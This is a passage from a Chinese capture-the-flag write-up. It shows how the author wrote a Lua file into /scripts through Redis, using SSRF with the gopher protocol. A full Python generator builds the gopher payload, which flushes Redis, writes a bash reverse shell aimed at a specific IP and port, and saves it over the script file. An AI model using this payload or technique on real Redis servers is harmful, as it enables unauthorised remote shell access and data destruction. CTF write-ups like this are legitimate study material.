4. 通过nginx.conf可知，主页面中间的那个黑框其实是一段内嵌的Lua脚本。这里因为看不懂Lua的语法，所以就借助AI帮我审计了一下这段Lua脚本。根据AI的回答，可以通过将反弹Shell的相关语句写入`/scripts/visit.script`来使得Lua脚本执行反弹Shell命令。![image.png](https://img.uettypi.top/2026/04/20260425171048053.png)
5. 那么该如何写入这个文件呢？很明显这道题中存在Redis服务，而Redis有两个主要的用处，一是直接在定时任务中写入反弹Shell的命令，但这个方法在这道题中是行不通的（别问为什么，问就是试过了），所以只能使用第二种方法，就是写入一个WebShell，然而这道题中并不存在PHP服务，所以并不是上传一个传统意义上的WebShell，而是利用Redis的写入功能，将包含反弹Shell命令的`visit.script`文件写到`/scripts`路径下。
6. 这里找了个适用于Redis的Gopher协议构造脚本（本来是想用Gopherus的，但Gopherus太死板了，只能写入PHPShell，这里没法用），将文件路径和内容设定好后，运行脚本即可获得payload。
```python
import urllib.parse

  

protocol = "gopher://"

ip = "127.0.0.1"

port = "6379"

shell = """

##LUA_START##

os.execute("bash -c 'bash -i >& /dev/tcp/47.123.4.104/1145 0>&1'")

##LUA_END##

"""

filename = "visit.script"

path = "/scripts"

  

cmd = [

"flushall",

"set 1 {}".format(shell.replace(" ", "${IFS}")),

"config set dir {}".format(path),

"config set dbfilename {}".format(filename),

"save"

]

  

payload = protocol + ip + ":" + port + "/_"

  

def redis_format(arr):

CRLF = "\r\n"

redis_arr = arr.split(" ")

cmd = ""

cmd += "*" + str(len(redis_arr))

for x in redis_arr:

cmd += CRLF + "$" + str(len((x.replace("${IFS}", " ")))) + CRLF + x.replace("${IFS}", " ")

cmd += CRLF

return cmd

  

if __name__ == "__main__":

for x in cmd:

payload += urllib.parse.quote(redis_format(x))

print(payload)
```
